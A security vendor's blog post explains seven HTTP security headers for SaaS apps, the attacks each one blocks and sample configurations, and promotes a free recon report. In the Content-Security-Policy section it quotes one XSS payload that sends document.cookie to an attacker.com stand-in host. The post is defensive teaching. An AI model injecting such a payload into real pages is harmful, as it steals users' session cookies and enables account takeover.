---
publishDate: 2026-03-20T00:00:00Z
title: 'The 7 HTTP Security Headers Every SaaS App Is Missing (And What Happens When They Are Gone)'
excerpt: 'Security headers are the fastest, cheapest wins in web application security. Yet in our external recon reports, we find at least three missing on almost every bootstrapped SaaS we check. Here is what each one does and what attackers can do without it.'
image: https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?ixlib=rb-4.0.3&auto=format&fit=crop&w=1740&q=80
category: Security Research
tags:
  - security-headers
  - web-security
  - saas
  - owasp
author: Vuldesk Security Team
metadata:
  title: '7 HTTP Security Headers Every SaaS App Is Missing — Vuldesk'
  description: 'The most common security header gaps we find in bootstrapped SaaS applications — and the real-world attacks that become possible without them.'
---

Security headers are HTTP response headers that tell browsers how to behave when loading your application. They cost nothing to implement — a few lines of configuration in your web server or middleware — and they prevent entire categories of attack.

In the external recon reports we run for SaaS founders, we check seven of them. On the average bootstrapped SaaS, we find at least three missing entirely and two misconfigured.

Here is what each header does, what the real-world attack looks like without it, and what a correct implementation looks like.

---

## 1. Content-Security-Policy (CSP)

**What it does:** Tells the browser which sources of scripts, styles, images, and other resources are allowed to load on your page. Everything not on the allowlist is blocked.

**What happens without it:** Cross-site scripting (XSS). If an attacker can inject JavaScript into your page — through a user input field, a third-party script, or a compromised CDN — the browser will execute it without question. XSS is consistently in the OWASP Top 10 and is the entry point for session hijacking, credential theft, and account takeover.

**What it looks like in practice:** A marketing SaaS with a "company name" field that gets rendered in the dashboard. An attacker enters `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`. Without CSP, every user who loads that page sends their session cookie to the attacker.

**Correct implementation:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.yourtrustedprovider.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.yourapp.com;
```

Start with `Content-Security-Policy-Report-Only` to understand what would break before enforcing.

---

## 2. Strict-Transport-Security (HSTS)

**What it does:** Tells the browser that your site should only ever be accessed over HTTPS — and to remember this for a specified duration. Even if a user types `http://yourapp.com`, the browser will upgrade to HTTPS before making the request.

**What happens without it:** SSL stripping attacks. On a network where an attacker can intercept traffic (public WiFi, corporate proxy, compromised router), they can downgrade an HTTPS connection to HTTP and intercept credentials, session tokens, and data in transit. This is not theoretical — it is trivially executable with tools available to any attacker.

**What it looks like in practice:** A founder demos their app to an enterprise prospect over conference WiFi. Without HSTS, a network attacker intercepts the login request and captures the founder's admin credentials.

**Correct implementation:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

The `preload` directive submits your domain to the browser preload list — hardcoded HTTPS for all users of Chrome, Firefox, and Safari.

---

## 3. X-Content-Type-Options

**What it does:** Prevents the browser from MIME-sniffing a response away from the declared `Content-Type`. If your server says a response is `text/plain`, the browser should treat it as text — not try to interpret it as HTML or JavaScript.

**What happens without it:** MIME confusion attacks. If a user can upload a file that gets served from your domain and an attacker uploads an HTML file disguised as a PNG, some browsers will execute it as HTML — including any embedded scripts.

**Correct implementation:**
```
X-Content-Type-Options: nosniff
```

One word. This is the lowest-effort security header with almost no downside.

---

## 4. X-Frame-Options

**What it does:** Controls whether your application can be embedded in an `<iframe>` on another site.

**What happens without it:** Clickjacking. An attacker builds a webpage that loads your app in a transparent iframe overlaid on top of their content. The user thinks they are clicking a button on the attacker's page but is actually clicking buttons inside your hidden app — confirming a payment, changing an email address, enabling a dangerous setting, or authorizing an OAuth connection.

**What it looks like in practice:** A billing SaaS without X-Frame-Options. An attacker builds a "click here to claim your prize" page with a transparent iframe of the billing confirmation button positioned exactly where the prize button appears. Users confirm charges they did not intend to make.

**Correct implementation:**
```
X-Frame-Options: SAMEORIGIN
```

Or use the newer CSP equivalent: `Content-Security-Policy: frame-ancestors 'self'`

---

## 5. Referrer-Policy

**What it does:** Controls how much URL information is sent in the `Referer` header when a user navigates from your page to another site.

**What happens without it:** URL-based information leakage. If your app puts sensitive data in URLs — user IDs, order references, password reset tokens, session identifiers — and a page links to an external resource (a CDN, an analytics script, a third-party integration), the full URL (including that sensitive data) is sent in the `Referer` header to the external server.

**What it looks like in practice:** A SaaS that puts account IDs in URLs (`/dashboard/accounts/84729`). Pages load a Google Font. Every page load sends `Referer: https://yourapp.com/dashboard/accounts/84729` to Google's servers — enumerating your customer IDs to a third party.

**Correct implementation:**
```
Referrer-Policy: strict-origin-when-cross-origin
```

---

## 6. Permissions-Policy

**What it does:** Restricts which browser features (camera, microphone, geolocation, payment APIs, etc.) your application and any embedded iframes are allowed to use.

**What happens without it:** Malicious third-party scripts or compromised CDN assets can access browser features your app never intended to use — including activating the camera or microphone on a user's device.

**What it looks like in practice:** A marketing analytics SaaS embeds a third-party heat mapping script. The script vendor is compromised. Without Permissions-Policy, the compromised script could attempt to access the user's microphone.

**Correct implementation:**
```
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
```

Only allow features your app actually needs. Deny everything else by default.

---

## 7. Server Header Disclosure

**What it does (or rather, what it should not do):** The `Server` response header reveals what web server software you are running and often its version number.

**What happens with it enabled:** Version disclosure. If your server responds with `Server: nginx/1.18.0`, an attacker knows exactly which version you are running and can look up every known CVE for that version before writing a single line of attack code. This is reconnaissance — freely handed to the attacker by your own server.

**What it looks like in practice:** We check the `Server` header in every external recon report. In over 60% of SaaS apps we scan, the header is present and includes a version number. The most common finding: `Server: nginx/1.14.0` — a version with multiple known high-severity vulnerabilities.

**Correct implementation:** Remove or neutralize the header in your web server config.

For nginx:
```nginx
server_tokens off;
```

For Apache:
```apache
ServerTokens Prod
ServerSignature Off
```

---

## How we check these in the free recon report

Every external recon report we run includes a full security header audit — all seven headers above, with a pass/fail verdict and the actual header value (or its absence) documented.

For most bootstrapped SaaS apps, adding the missing headers takes less than an hour and closes a meaningful slice of the external attack surface immediately.

If you want to know which of these your app is missing right now:

**[Get your free recon report — delivered in 24 hours →](/free-recon)**

---

## Quick reference

| Header | Prevents | Implementation effort |
|---|---|---|
| Content-Security-Policy | XSS, script injection | Medium (requires testing) |
| Strict-Transport-Security | SSL stripping, downgrade attacks | Low |
| X-Content-Type-Options | MIME confusion attacks | Very low |
| X-Frame-Options | Clickjacking | Very low |
| Referrer-Policy | URL-based info leakage | Very low |
| Permissions-Policy | Unauthorized browser feature access | Low |
| Server header removal | Version-based reconnaissance | Very low |

Five of these seven take under five minutes to implement. The other two (CSP and Permissions-Policy) require a bit more thought about what your app actually uses. None of them require code changes to your application logic.

There is no good reason to leave them missing.
